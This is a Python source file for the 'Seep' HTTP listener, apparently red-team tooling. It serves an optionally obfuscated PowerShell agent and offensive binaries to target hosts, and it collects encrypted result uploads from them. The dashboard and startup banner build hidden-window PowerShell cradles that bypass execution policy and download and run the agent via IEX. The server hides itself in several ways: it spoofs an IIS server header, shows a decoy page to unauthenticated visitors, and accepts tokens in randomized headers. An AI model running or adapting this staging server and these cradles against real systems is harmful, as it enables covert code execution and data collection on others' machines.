"""Seep unified HTTP server."""

from __future__ import annotations

import gzip
import hashlib
import hmac
import html as _html_mod
import json
import re
import socket
import sys
import threading
import zipfile
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from io import BytesIO
from pathlib import Path
from urllib.parse import parse_qs, urlparse

from server.agent.composer import AgentComposer
from server.config import ServerConfig

# ANSI colour helpers
_RESET = "\033[0m"
_BOLD = "\033[1m"
_GREEN = "\033[32m"
_CYAN = "\033[36m"
_YELLOW = "\033[33m"
_RED = "\033[31m"
_MAGENTA = "\033[35m"
_DIM = "\033[2m"

_MAX_UPLOAD_BYTES = 50 * 1024 * 1024  # 50 MB
_MAX_DECOMPRESSED_BYTES = 200 * 1024 * 1024  # 200 MB


def _color(colour: str, text: str) -> str:
    return f"{colour}{text}{_RESET}"


# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------


def get_local_ips() -> list[str]:
    """Return local IPs, preferring tun/tap interfaces then eth, then others."""
    import fcntl
    import struct
    import array

    preferred_prefixes = ("tun", "tap", "eth", "ens", "enp", "wlan")
    ips: dict[str, str] = {}  # iface -> ip

    try:
        # SIOCGIFCONF — enumerate all interfaces
        SIOCGIFCONF = 0x8912
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            buf = array.array("B", b"\0" * 4096)
            ifconf = struct.pack("iL", buf.buffer_info()[1], buf.buffer_info()[0])
            res = fcntl.ioctl(s.fileno(), SIOCGIFCONF, ifconf)
            length = struct.unpack("i", res[:4])[0]
            data = bytes(buf)[:length]
            offset = 0
            while offset < length:
                iface = (
                    data[offset : offset + 16]
                    .rstrip(b"\x00")
                    .decode("utf-8", errors="ignore")
                    .strip("\x00")
                )
                raw_ip = data[offset + 20 : offset + 24]
                try:
                    ip = socket.inet_ntoa(raw_ip)
                    if ip and not ip.startswith("127."):
                        ips[iface] = ip
                except (OSError, ValueError):
                    pass
                offset += 40
    except OSError:
        pass

    if not ips:
        # Fallback: connect UDP and grab local IP
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect(("8.8.8.8", 80))
                return [s.getsockname()[0]]
        except OSError:
            return ["127.0.0.1"]

    def sort_key(item: tuple[str, str]) -> int:
        iface = item[0]
        for rank, prefix in enumerate(preferred_prefixes):
            if iface.startswith(prefix):
                return rank
        return len(preferred_prefixes)

    ordered = [ip for _, ip in sorted(ips.items(), key=sort_key)]
    return ordered if ordered else ["127.0.0.1"]


# ---------------------------------------------------------------------------
# HTML index page
# ---------------------------------------------------------------------------

_BENIGN_HTML = """\
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Service</title></head>
<body><p>It works!</p></body>
</html>
"""

_DASHBOARD_HTML = """\
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Dashboard</title>
<style>
  :root {{
    --bg: #0d1117;
    --surface: #161b22;
    --border: #30363d;
    --accent: #58a6ff;
    --green: #3fb950;
    --yellow: #d29922;
    --red: #f85149;
    --text: #c9d1d9;
    --muted: #8b949e;
    --code-bg: #1c2128;
  }}
  * {{ box-sizing: border-box; margin: 0; padding: 0; }}
  body {{ background: var(--bg); color: var(--text); font-family: 'Segoe UI', system-ui, sans-serif; font-size: 14px; line-height: 1.6; }}
  a {{ color: var(--accent); text-decoration: none; }}
  a:hover {{ text-decoration: underline; }}
  header {{ background: var(--surface); border-bottom: 1px solid var(--border); padding: 16px 32px; display: flex; align-items: center; gap: 12px; }}
  header h1 {{ font-size: 20px; font-weight: 700; letter-spacing: 1px; color: var(--accent); }}
  .container {{ max-width: 1100px; margin: 0 auto; padding: 24px 32px; }}
  .grid {{ display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px; }}
  .card {{ background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 20px; }}
  .card h2 {{ font-size: 13px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; color: var(--muted); margin-bottom: 12px; padding-bottom: 8px; border-bottom: 1px solid var(--border); }}
  .stat-row {{ display: flex; gap: 20px; margin: 16px 0; }}
  .stat {{ background: var(--code-bg); border-radius: 6px; padding: 12px 16px; flex: 1; }}
  .stat .label {{ font-size: 11px; color: var(--muted); text-transform: uppercase; letter-spacing: 0.5px; }}
  .stat .value {{ font-size: 22px; font-weight: 700; color: var(--accent); margin-top: 2px; }}
  pre, code {{ font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace; font-size: 12px; }}
  pre {{ background: var(--code-bg); border: 1px solid var(--border); border-radius: 6px; padding: 12px 14px; overflow-x: auto; margin: 6px 0; white-space: pre-wrap; word-break: break-all; }}
  .cradle-label {{ font-size: 11px; color: var(--muted); margin-top: 10px; margin-bottom: 2px; }}
  table {{ width: 100%; border-collapse: collapse; font-size: 12px; }}
  th {{ text-align: left; padding: 6px 10px; border-bottom: 1px solid var(--border); color: var(--muted); font-weight: 600; text-transform: uppercase; font-size: 11px; }}
  td {{ padding: 8px 10px; border-bottom: 1px solid rgba(48,54,61,.5); }}
  tr:hover td {{ background: rgba(88,166,255,.04); }}
  .link-list a {{ display: block; padding: 6px 0; border-bottom: 1px solid rgba(48,54,61,.4); color: var(--accent); }}
  .link-list a:last-child {{ border-bottom: none; }}
  .full-width {{ grid-column: 1 / -1; }}
  footer {{ text-align: center; padding: 20px; color: var(--muted); font-size: 11px; border-top: 1px solid var(--border); margin-top: 32px; }}
</style>
</head>
<body>
<header>
  <h1>&#x25C8; Dashboard</h1>
</header>

<div class="container">

  <div class="stat-row">
    <div class="stat">
      <div class="label">Listener</div>
      <div class="value" style="font-size:16px;">{primary_ip}:{http_port}</div>
    </div>
    <div class="stat">
      <div class="label">Results</div>
      <div class="value">{results_count}</div>
    </div>
    <div class="stat">
      <div class="label">Checks</div>
      <div class="value">{checks_count}</div>
    </div>
    <div class="stat">
      <div class="label">Tools</div>
      <div class="value">{tools_count}</div>
    </div>
  </div>

  <div class="grid">

    <div class="card full-width">
      <h2>Cradles</h2>
      <p class="cradle-label">[1] IEX (WebClient)</p>
      <pre>{cradle_iex}</pre>
      <p class="cradle-label">[2] IEX (stealth)</p>
      <pre>{cradle_iex_hidden}</pre>
      <p class="cradle-label">[3] IEX (iwr)</p>
      <pre>{cradle_iwr}</pre>
    </div>

    <div class="card">
      <h2>Checks</h2>
      {checks_table}
    </div>

    <div class="card">
      <h2>Results</h2>
      {results_table}
    </div>

  </div>
</div>

<footer>{timestamp}</footer>
</body>
</html>
"""


# ---------------------------------------------------------------------------
# Request handler
# ---------------------------------------------------------------------------


class SeepHTTPHandler(BaseHTTPRequestHandler):
    """Unified HTTP handler — agent delivery, tool serving, result upload."""

    # Override default Server header to avoid fingerprinting as Python http.server
    server_version = "Microsoft-IIS/10.0"
    sys_version = ""

    # NOTE: config and composer must be injected via create_handler() factory.
    # Do not instantiate SeepHTTPHandler directly.
    config: ServerConfig
    composer: AgentComposer
    _agent_cache: str | None = None
    _agent_cache_lock: threading.Lock = threading.Lock()

    # ------------------------------------------------------------------
    # Logging
    # ------------------------------------------------------------------

    def log_message(self, fmt: str, *args: object) -> None:
        method = self.command or "?"
        path = self.path or "/"

        method_colour = {
            "GET": _GREEN,
            "POST": _YELLOW,
            "PUT": _CYAN,
            "DELETE": _RED,
        }.get(method, _DIM)

        ts = datetime.now().strftime("%H:%M:%S")
        code = args[1] if len(args) > 1 else "???"

        code_str = str(code)
        if code_str.startswith("2"):
            code_colour = _GREEN
        elif code_str.startswith("4"):
            code_colour = _YELLOW
        elif code_str.startswith("5"):
            code_colour = _RED
        else:
            code_colour = _DIM

        client_ip = self.client_address[0] if self.client_address else "?"
        print(
            f"{_DIM}{ts}{_RESET} "
            f"{_color(method_colour, f'{method:<6}')}"
            f"{_color(_CYAN, path)}"
            f"  {_color(code_colour, code_str)}"
            f"  {_DIM}{client_ip}{_RESET}"
        )

    def log_error(self, fmt: str, *args: object) -> None:
        ts = datetime.now().strftime("%H:%M:%S")
        msg = fmt % args if args else fmt
        print(f"{_DIM}{ts}{_RESET} {_RED}ERROR{_RESET} {msg}", file=sys.stderr)

    # ------------------------------------------------------------------
    # Routing
    # ------------------------------------------------------------------

    def _check_request_auth(self) -> bool:
        """Check auth token from query string or header. Returns True if valid."""
        if not self.config.auth_token:
            return True
        parsed = urlparse(self.path)
        qs = parse_qs(parsed.query)
        token = (
            qs.get("token", [""])[0]
            or self.headers.get("X-Auth-Token", "")
            or self.headers.get("X-Seep-Token", "")
        )
        if not token:
            # Scan X- headers for matching token (supports randomized header names)
            for hdr_name in self.headers:
                if hdr_name.lower().startswith("x-") and hdr_name.lower() not in (
                    "x-forwarded-for", "x-forwarded-host", "x-forwarded-proto",
                    "x-real-ip", "x-request-id", "x-correlation-id",
                ):
                    val = self.headers.get(hdr_name, "")
                    if val and hmac.compare_digest(val, self.config.auth_token):
                        token = val
                        break
        if not token:
            return False
        return hmac.compare_digest(token, self.config.auth_token)

    def _strip_prefix(self, path: str) -> str | None:
        """Strip the configured URL prefix from a path. Returns None if prefix doesn't match."""
        prefix = self.config.url_prefix.rstrip("/")
        if not prefix:
            return path
        if path == prefix or path.startswith(prefix + "/"):
            return path[len(prefix):] or "/"
        # When a url_prefix is configured, only bare root "/" shows the benign page.
        # /index and /index.html without prefix return 404 to avoid revealing the server.
        if not prefix and path.rstrip("/") in ("", "/", "/index", "/index.html"):
            return path
        if prefix and path.rstrip("/") in ("", "/"):
            return path
        return None

    def do_GET(self) -> None:
        parsed = urlparse(self.path)
        clean = self._strip_prefix(parsed.path.rstrip("/") or "/")

        if clean is None:
            self.send_error(404, "Not found")
            return

        if clean in ("", "/", "/index", "/index.html"):
            self._serve_index()
        elif clean.startswith("/agent") or clean in ("/Seep.ps1", "/agent.ps1"):
            if not self._check_request_auth():
                self.send_error(404, "Not found")
                return
            self._serve_agent(parsed)
        elif clean == "/cradle":
            if not self._check_request_auth():
                self.send_error(404, "Not found")
                return
            self._serve_cradle()
        elif clean.startswith("/tools"):
            if not self._check_request_auth():
                self.send_error(404, "Not found")
                return
            self._serve_tool(parsed.path)
        elif clean == "/api/results":
            if not self._check_request_auth():
                self.send_error(404, "Not found")
                return
            self._serve_results_list()
        else:
            self.send_error(404, "Not found")

    def do_POST(self) -> None:
        parsed = urlparse(self.path)
        clean = self._strip_prefix(parsed.path.rstrip("/"))

        if clean is None:
            self.send_error(404, "Not found")
            return

        if clean in ("/api/results", "/upload"):
            self._receive_results()
        else:
            self.send_error(404, "Not found")

    # ------------------------------------------------------------------
    # Security headers
    # ------------------------------------------------------------------

    def _add_security_headers(self) -> None:
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("X-Frame-Options", "DENY")
        self.send_header("Cache-Control", "no-store")
        self.send_header(
            "Content-Security-Policy", "default-src 'none'; style-src 'unsafe-inline'"
        )

    # ------------------------------------------------------------------
    # GET handlers
    # ------------------------------------------------------------------

    def _check_dashboard_auth(self) -> bool:
        """Return True if the request carries a valid auth token (query or header)."""
        return self._check_request_auth()

    def _serve_index(self) -> None:
        # Gate the real dashboard behind auth — unauthenticated visitors see a benign page
        if not self._check_dashboard_auth():
            body = _BENIGN_HTML.encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self._add_security_headers()
            self.end_headers()
            self.wfile.write(body)
            return

        ips = get_local_ips()
        primary_ip = ips[0] if ips else "127.0.0.1"
        scheme = "https" if self.config.tls.enabled else "http"
        prefix = self.config.url_prefix.rstrip("/")
        base_url = f"{scheme}://{primary_ip}:{self.config.http_port}{prefix}"

        agent_url = f"{base_url}/agent.ps1"
        if self.config.auth_token:
            agent_url += f"?token={self.config.auth_token}"
        token_arg = f" -Token {self.config.auth_token}" if self.config.auth_token else ""
        cradle_iex = (
            f"powershell -ep bypass -c "
            f"\"IEX(New-Object Net.WebClient).DownloadString('{agent_url}'); Invoke-Seep{token_arg}\""
        )
        cradle_iex_hidden = (
            f"powershell -ep bypass -NoP -W Hidden -c "
            f"\"IEX(New-Object Net.WebClient).DownloadString('{agent_url}'); Invoke-Seep{token_arg}\""
        )
        cradle_iwr = (
            f"powershell -ep bypass -c "
            f"\"iex((iwr '{agent_url}' -UseBasicParsing).Content); Invoke-Seep{token_arg}\""
        )

        # Checks table
        checks = self.composer.list_checks()
        if checks:
            rows = "".join(
                f"<tr><td><code>{_html_escape(c.check_id)}</code></td>"
                f"<td>{_html_escape(c.check_name)}</td>"
                f"<td>{_html_escape(c.opsec_impact)}</td></tr>"
                for c in checks
            )
            checks_table = (
                "<table><tr><th>ID</th><th>Name</th><th>Opsec</th></tr>"
                + rows
                + "</table>"
            )
        else:
            checks_table = "<p style='color:var(--muted)'>No checks found.</p>"

        # Results table
        results_dir = self.config.workdir / self.config.results.output_dir
        result_entries = self._list_results(results_dir)
        if result_entries:
            rows = "".join(
                f"<tr><td>{_html_escape(str(e.get('hostname', '?')))}</td>"
                f"<td>{_html_escape(str(e.get('timestamp', '?')))}</td>"
                f"<td>{_html_escape(str(e.get('findings_count', '?')))}</td></tr>"
                for e in result_entries[:10]
            )
            results_table = (
                "<table><tr><th>Host</th><th>When</th><th>Findings</th></tr>"
                + rows
                + "</table>"
            )
        else:
            results_table = "<p style='color:var(--muted)'>No results yet.</p>"

        # Tool count
        tools_dir = self.config.workdir / self.config.catalog.tools_dir
        tools_count = 0
        if tools_dir.exists():
            flat = tools_dir / "all"
            if flat.exists():
                tools_count = sum(1 for _ in flat.iterdir())
            else:
                tools_count = sum(1 for _ in tools_dir.rglob("*") if _.is_file())

        # SAFETY: checks_table and results_table contain pre-built HTML.
        # All values within them MUST be escaped via _html_escape() before insertion.
        html = _DASHBOARD_HTML.format(
            primary_ip=_html_escape(primary_ip),
            http_port=self.config.http_port,
            results_count=len(result_entries),
            checks_count=len(checks),
            tools_count=tools_count,
            cradle_iex=_html_escape(cradle_iex),
            cradle_iex_hidden=_html_escape(cradle_iex_hidden),
            cradle_iwr=_html_escape(cradle_iwr),
            checks_table=checks_table,
            results_table=results_table,
            timestamp=_html_escape(datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
        )

        body = html.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self._add_security_headers()
        self.end_headers()
        self.wfile.write(body)

    def _serve_agent(self, parsed) -> None:
        # Parse query params: ?checks=a,b&exclude=c,d
        params = parse_qs(parsed.query)
        checks_param = params.get("checks", [None])[0]
        exclude_param = params.get("exclude", [None])[0]

        checks_list = (
            [c.strip() for c in checks_param.split(",")] if checks_param else None
        )
        exclude_list = (
            [e.strip() for e in exclude_param.split(",")] if exclude_param else None
        )

        custom = checks_list is not None or exclude_list is not None

        # Build server URL for auto-invoke embedding
        ips = get_local_ips()
        primary_ip = ips[0] if ips else "127.0.0.1"
        scheme = "https" if self.config.tls.enabled else "http"
        prefix = self.config.url_prefix.rstrip("/")
        compose_server_url = f"{scheme}://{primary_ip}:{self.config.http_port}{prefix}"

        with self.__class__._agent_cache_lock:
            if custom or self.__class__._agent_cache is None:
                content = self.composer.compose(
                    checks=checks_list,
                    exclude=exclude_list,
                    obfuscate=self.config.agent.obfuscate,
                    strip_comments=self.config.agent.strip_comments,
                    auth_token=self.config.auth_token,
                    server_url=compose_server_url,
                )
                if not custom:
                    self.__class__._agent_cache = content
            else:
                content = self.__class__._agent_cache

        body = content.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Disposition", 'inline; filename="Seep.ps1"')
        self.send_header("Content-Length", str(len(body)))
        self._add_security_headers()
        self.end_headers()
        self.wfile.write(body)

    def _serve_cradle(self) -> None:
        ips = get_local_ips()
        primary_ip = ips[0] if ips else "127.0.0.1"
        scheme = "https" if self.config.tls.enabled else "http"
        prefix = self.config.url_prefix.rstrip("/")
        server_url = f"{scheme}://{primary_ip}:{self.config.http_port}{prefix}"

        text = self.composer.compose_cradle(
            server_url, auth_token=self.config.auth_token
        )
        body = text.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self._add_security_headers()
        self.end_headers()
        self.wfile.write(body)

    def _serve_tool(self, url_path: str) -> None:
        # Strip leading /tools/ prefix
        rel = url_path.lstrip("/")
        if rel.startswith("tools/"):
            rel = rel[len("tools/") :]

        tools_dir = self.config.workdir / self.config.catalog.tools_dir
        candidate = (tools_dir / rel).resolve()

        # Safety: must be inside tools_dir
        try:
            candidate.relative_to(tools_dir.resolve())
        except ValueError:
            self.send_error(403, "Forbidden")
            return

        if not candidate.exists() or not candidate.is_file():
            self.send_error(404, "Tool not found")
            return

        suffix = candidate.suffix.lower()
        if suffix in (".exe", ".dll", ".bin"):
            content_type = "application/octet-stream"
        elif suffix in (".ps1", ".py", ".sh", ".txt", ".md"):
            content_type = "text/plain; charset=utf-8"
        elif suffix == ".zip":
            content_type = "application/zip"
        else:
            content_type = "application/octet-stream"

        file_size = candidate.stat().st_size
        safe_name = re.sub(r"[^a-zA-Z0-9._-]", "_", candidate.name)
        self.send_response(200)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(file_size))
        self.send_header("Content-Disposition", f'attachment; filename="{safe_name}"')
        self._add_security_headers()
        self.end_headers()
        with open(candidate, "rb") as f:
            while True:
                chunk = f.read(65536)
                if not chunk:
                    break
                self.wfile.write(chunk)

    def _serve_results_list(self) -> None:
        results_dir = self.config.workdir / self.config.results.output_dir
        entries = self._list_results(results_dir)
        body = json.dumps(entries, indent=2).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self._add_security_headers()
        self.end_headers()
        self.wfile.write(body)

    # ------------------------------------------------------------------
    # POST handlers
    # ------------------------------------------------------------------

    def _receive_results(self) -> None:
        # Authenticate upload if a token is configured
        # Check multiple sources: dedicated header, legacy header, any X- header value
        if self.config.auth_token:
            token = self.headers.get("X-Seep-Token", "") or self.headers.get("X-Auth-Token", "")
            if not token:
                # Scan all X- headers for a matching token value (supports randomized headers)
                for hdr_name in self.headers:
                    if hdr_name.lower().startswith("x-"):
                        val = self.headers.get(hdr_name, "")
                        if val and hmac.compare_digest(val, self.config.auth_token):
                            token = val
                            break
            if not token or not hmac.compare_digest(token, self.config.auth_token):
                self.send_error(404, "Not found")
                return

        try:
            length = int(self.headers.get("Content-Length", 0))
        except ValueError:
            self._json_response(
                400, {"status": "error", "message": "Invalid Content-Length"}
            )
            return

        if length <= 0:
            self._json_response(400, {"status": "error", "message": "Empty body"})
            return

        if length > _MAX_UPLOAD_BYTES:
            self._json_response(413, {"status": "error", "message": "Upload too large"})
            return

        raw = self.rfile.read(length)

        # AES decryption — if encoding header indicates aes-gzip, decrypt first
        encoding_hdr = ""
        for h in ("X-Seep-Encoding", "X-Auth-Encoding"):
            encoding_hdr = self.headers.get(h, "")
            if encoding_hdr:
                break
        if not encoding_hdr:
            # Scan X- headers for aes-gzip value (supports randomized header names)
            for hdr_name in self.headers:
                if hdr_name.lower().startswith("x-"):
                    val = self.headers.get(hdr_name, "")
                    if val in ("aes-gzip", "gzip"):
                        encoding_hdr = val
                        break

        if encoding_hdr == "aes-gzip" and self.config.auth_token:
            try:
                from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
                from cryptography.hazmat.primitives import padding as crypto_padding

                key = hashlib.sha256(self.config.auth_token.encode("utf-8")).digest()
                iv = raw[:16]
                ciphertext = raw[16:]
                cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
                decryptor = cipher.decryptor()
                padded = decryptor.update(ciphertext) + decryptor.finalize()
                unpadder = crypto_padding.PKCS7(128).unpadder()
                raw = unpadder.update(padded) + unpadder.finalize()
            except ImportError:
                self._json_response(
                    400, {"status": "error", "message": "AES decryption requires the cryptography package: pip install cryptography"}
                )
                return
            except Exception as exc:
                self.log_error("AES decryption failed: %s", exc)
                self._json_response(
                    400, {"status": "error", "message": "Decryption failed"}
                )
                return

        # Detect encoding: GZip (from fileless agent) or ZIP
        if raw[:2] == b"\x1f\x8b":
            try:
                buf = BytesIO(raw)
                chunks = []
                total = 0
                with gzip.GzipFile(fileobj=buf) as gz:
                    while True:
                        chunk = gz.read(65536)
                        if not chunk:
                            break
                        total += len(chunk)
                        if total > _MAX_DECOMPRESSED_BYTES:
                            self._json_response(
                                413,
                                {
                                    "status": "error",
                                    "message": "Decompressed payload too large",
                                },
                            )
                            return
                        chunks.append(chunk)
                json_data = b"".join(chunks)
            except OSError:
                self._json_response(
                    400, {"status": "error", "message": "Invalid gzip data"}
                )
                return
        elif raw[:4] == b"PK\x03\x04":
            json_data = self._extract_json_from_zip(raw)
            if json_data is None:
                self._json_response(
                    400, {"status": "error", "message": "No results.json in ZIP"}
                )
                return
        else:
            json_data = raw

        # Parse JSON to extract metadata
        hostname = "unknown"
        findings_count = 0
        try:
            parsed = json.loads(json_data.decode("utf-8", errors="replace"))
            meta = parsed.get("meta", parsed.get("metadata", {}))
            hostname = meta.get("hostname", meta.get("computer_name", "unknown"))
            findings = parsed.get("findings", parsed.get("results", []))
            if isinstance(findings, list):
                findings_count = len(findings)
            elif isinstance(findings, dict):
                findings_count = sum(
                    len(v) if isinstance(v, list) else 1 for v in findings.values()
                )
        except (json.JSONDecodeError, AttributeError):
            pass

        # Sanitise hostname for use in filename
        safe_host = "".join(c if c.isalnum() or c in "-_" else "_" for c in hostname)[
            :32
        ]
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"results_{ts}_{safe_host}.json"

        results_dir = self.config.workdir / self.config.results.output_dir
        results_dir.mkdir(parents=True, exist_ok=True)
        out_path = results_dir / filename
        out_path.write_bytes(json_data)

        print(
            f"\n{_color(_GREEN, '[+] Results received')}"
            f"  host={_color(_CYAN, hostname)}"
            f"  findings={_color(_YELLOW, str(findings_count))}"
            f"  file={_color(_DIM, filename)}\n"
        )

        self._json_response(
            200,
            {
                "status": "ok",
                "filename": filename,
                "hostname": hostname,
                "findings_count": findings_count,
            },
        )

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _extract_json_from_zip(self, raw: bytes) -> bytes | None:
        """Extract results.json from a ZIP payload."""
        try:
            with zipfile.ZipFile(BytesIO(raw)) as zf:
                # Prefer explicit results.json, else first .json found
                names = zf.namelist()
                # Reject zip entries with path traversal or absolute paths
                names = [n for n in names if '..' not in n and not n.startswith('/')]
                target = None
                for name in names:
                    if (
                        name.lower().endswith("results.json")
                        or name.lower() == "results.json"
                    ):
                        target = name
                        break
                if target is None:
                    target = next(
                        (n for n in names if n.lower().endswith(".json")), None
                    )
                if target is None:
                    return None
                with zf.open(target) as entry_file:
                    chunks = []
                    total = 0
                    while True:
                        chunk = entry_file.read(65536)
                        if not chunk:
                            break
                        total += len(chunk)
                        if total > _MAX_DECOMPRESSED_BYTES:
                            return None
                        chunks.append(chunk)
                return b"".join(chunks)
        except zipfile.BadZipFile:
            return None

    def _list_results(self, results_dir: Path) -> list[dict]:
        """Return a list of result metadata dicts from the results directory."""
        if not results_dir.exists():
            return []

        entries = []
        for jf in sorted(results_dir.glob("results_*.json"), reverse=True)[:50]:
            entry: dict = {
                "filename": jf.name,
                "timestamp": "",
                "hostname": "unknown",
                "findings_count": 0,
            }
            try:
                data = json.loads(jf.read_text(encoding="utf-8", errors="replace"))
                meta = data.get("meta", data.get("metadata", {}))
                entry["hostname"] = meta.get(
                    "hostname", meta.get("computer_name", "unknown")
                )
                findings = data.get("findings", data.get("results", []))
                if isinstance(findings, list):
                    entry["findings_count"] = len(findings)
                elif isinstance(findings, dict):
                    entry["findings_count"] = sum(
                        len(v) if isinstance(v, list) else 1 for v in findings.values()
                    )
                # Extract timestamp from filename: results_YYYYMMDD_HHMMSS_host.json
                parts = jf.stem.split("_")
                if len(parts) >= 3:
                    try:
                        dt = datetime.strptime(
                            f"{parts[1]}_{parts[2]}", "%Y%m%d_%H%M%S"
                        )
                        entry["timestamp"] = dt.strftime("%Y-%m-%d %H:%M:%S")
                    except ValueError:
                        entry["timestamp"] = datetime.fromtimestamp(
                            jf.stat().st_mtime
                        ).strftime("%Y-%m-%d %H:%M:%S")
            except (json.JSONDecodeError, OSError):
                pass
            entries.append(entry)

        return entries

    def _json_response(self, code: int, payload: dict) -> None:
        body = json.dumps(payload).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self._add_security_headers()
        self.end_headers()
        self.wfile.write(body)


# ---------------------------------------------------------------------------
# HTML escape helper
# ---------------------------------------------------------------------------


def _html_escape(text: str) -> str:
    return _html_mod.escape(str(text), quote=True)


# ---------------------------------------------------------------------------
# Factory + server startup
# ---------------------------------------------------------------------------


def create_handler(config: ServerConfig, composer: AgentComposer) -> type:
    """Return a handler class with config and composer injected as class attributes."""

    class _Handler(SeepHTTPHandler):
        pass

    _Handler.config = config
    _Handler.composer = composer
    _Handler._agent_cache = None
    _Handler._agent_cache_lock = threading.Lock()
    return _Handler


def _print_banner(config: ServerConfig, ips: list[str]) -> None:
    scheme = "https" if config.tls.enabled else "http"
    primary = ips[0] if ips else "0.0.0.0"

    print()
    print(_color(_CYAN, "  ╔══════════════════════════════════════════╗"))
    print(
        _color(_CYAN, "  ║")
        + _color(_BOLD, "   Seep  Listener")
        + _color(_CYAN, "                           ║")
    )
    print(_color(_CYAN, "  ╚══════════════════════════════════════════╝"))
    print()
    print(f"  {_color(_DIM, 'Port      ')} {_color(_YELLOW, str(config.http_port))}")
    print(f"  {_color(_DIM, 'TLS       ')} {'yes' if config.tls.enabled else 'no'}")
    print(f"  {_color(_DIM, 'Bind      ')} {config.bind_address}")
    if config.auth_token:
        masked = config.auth_token[:8] + "*" * (len(config.auth_token) - 8)
        print(f"  {_color(_DIM, 'Auth Token')} {_color(_MAGENTA, masked)}")
    print()
    print(f"  {_color(_DIM, 'Interfaces:')}")
    for ip in ips:
        url = f"{scheme}://{ip}:{config.http_port}"
        print(f"    {_color(_GREEN, url)}")
    print()
    prefix = config.url_prefix.rstrip("/")
    print(f"  {_color(_DIM, 'Cradle (IEX):')}")
    agent_url = f"{scheme}://{primary}:{config.http_port}{prefix}/agent.ps1"
    if config.auth_token:
        agent_url += f"?token={config.auth_token}"
    token_arg = f" -Token {config.auth_token}" if config.auth_token else ""
    iex = (
        f"powershell -ep bypass -c "
        f"\"IEX(New-Object Net.WebClient).DownloadString('{agent_url}'); Invoke-Seep{token_arg}\""
    )
    print(f"    {_color(_CYAN, iex)}")
    print()
    print(
        f"  {_color(_DIM, 'Full cradles:')} {scheme}://{primary}:{config.http_port}{prefix}/cradle"
    )
    print()
    print(_color(_DIM, "  Press Ctrl+C to stop"))
    print()


def start_server(config: ServerConfig) -> None:
    """Start the Seep HTTP server (blocking)."""
    composer = AgentComposer()
    handler_class = create_handler(config, composer)

    server = HTTPServer((config.bind_address, config.http_port), handler_class)
    server.timeout = 30  # Per-request timeout (seconds)

    if config.tls.enabled:
        from server.http.tls import wrap_server_tls

        server = wrap_server_tls(server, config)

    ips = get_local_ips()
    _print_banner(config, ips)

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{_color(_YELLOW, '[*] Server stopped')}")
        server.server_close()
